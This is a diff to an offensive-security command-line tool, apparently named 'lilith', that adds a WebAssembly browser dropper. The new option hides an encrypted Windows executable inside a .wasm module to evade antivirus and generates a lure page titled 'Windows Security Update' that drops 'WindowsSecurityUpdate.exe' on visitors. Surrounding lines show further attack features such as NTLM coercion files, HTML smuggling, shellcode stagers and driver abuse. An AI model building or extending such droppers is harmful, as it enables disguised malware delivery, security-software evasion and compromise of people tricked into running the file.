@@ -121,6 +121,16 @@ BUILD FLAGS
     --smuggle-lnk NAME  LNK display name inside ISO
     --smuggle-iso NAME  ISO filename shown in browser download bar
 
+  --wasm                Build WebAssembly browser dropper:
+                          • Wraps the compiled runner PE in a .wasm module (AV evasion)
+                          • .wasm on disk contains only valid WASM bytecode — no PE magic,
+                            no x64 opcodes, no shellcode patterns detectable by AV
+                          • Generates wasm_loader.html: target visits URL → JS instantiates
+                            WASM, decrypts PE in WASM linear memory, triggers .exe download
+                          • WASM XOR key is independent from the runner XOR key
+    --wasm-exe NAME     Filename for the downloaded .exe (default: WindowsSecurityUpdate.exe)
+    --wasm-title TITLE  HTML lure page title (default: Windows Security Update)
+
   --ntlm-trigger        Generate NTLM coercion trigger files:
                           • .url (Internet Shortcut), .scf (Shell Command File),
                             .searchConnector-ms (Search Connector)
@@ -695,6 +705,31 @@ def cmd_build(args, cfg, ws):
         )
         did_something = True
 
+    # ── WASM browser dropper ─────────────────────────────────────────────────
+    if getattr(args, "wasm", False):
+        runner_dat_name = ws.get_enc_name("__runner_dat__")
+        if not runner_dat_name:
+            print("[!] Runner not built yet — run: lilith build --runner first")
+            sys.exit(1)
+        runner_dat_path = ws.path(runner_dat_name)
+        if not os.path.exists(runner_dat_path):
+            print(f"[!] Runner not found: {runner_dat_path} — run: lilith build --runner first")
+            sys.exit(1)
+        from builders.wasm_stage import build_wasm_dropper
+        wasm_exe   = getattr(args, "wasm_exe",   None) or "WindowsSecurityUpdate.exe"
+        wasm_title = getattr(args, "wasm_title", None) or "Windows Security Update"
+        build_wasm_dropper(
+            runner_dat_path = runner_dat_path,
+            runner_xor_key  = _read_runner_key(ws),
+            out_dir         = ws.directory,
+            lhost           = cfg.get("lhost", "10.10.14.1"),
+            port            = cfg.get("http_port", 8443),
+            url_prefix      = cfg.get("url_prefix", "/cdn/static/v3"),
+            exe_name        = wasm_exe,
+            page_title      = wasm_title,
+        )
+        did_something = True
+
     # ── NTLM trigger files ────────────────────────────────────────────────────
     if getattr(args, "ntlm_trigger", False):
         ntlm_out = getattr(args, "ntlm_out", None) or ws.path("ntlm_trigger")
@@ -706,7 +741,8 @@ def cmd_build(args, cfg, ws):
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
         print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
         print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger,")
-        print("    --android-ble, --android-payload, or --android-ble + --android-payload")
+        print("    --android-ble, --android-payload, --android-ble + --android-payload,")
+        print("    or --wasm [--wasm-exe NAME] [--wasm-title TITLE]")
 
 
 def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
@@ -1414,6 +1450,12 @@ def main():
                          help="ISO filename in browser download bar (default: WindowsSecurityUpdate.iso)")
     build_p.add_argument("--smuggle-out",    metavar="DIR",   dest="smuggle_out",  default=None,
                          help="Output directory (default: workspace root)")
+    build_p.add_argument("--wasm",           action="store_true",
+                         help="Wrap runner PE in a WebAssembly module + HTML browser dropper for AV evasion")
+    build_p.add_argument("--wasm-exe",      metavar="NAME",  dest="wasm_exe",   default=None,
+                         help="Filename for the downloaded .exe (default: WindowsSecurityUpdate.exe)")
+    build_p.add_argument("--wasm-title",    metavar="TITLE", dest="wasm_title", default=None,
+                         help="HTML lure page title (default: Windows Security Update)")
     build_p.add_argument("--ntlm-trigger",  action="store_true", dest="ntlm_trigger",
                          help="Generate .url/.scf/.searchConnector NTLM trigger files (auto-auth on folder browse)")
     build_p.add_argument("--ntlm-out",      metavar="DIR",   dest="ntlm_out",     default=None,
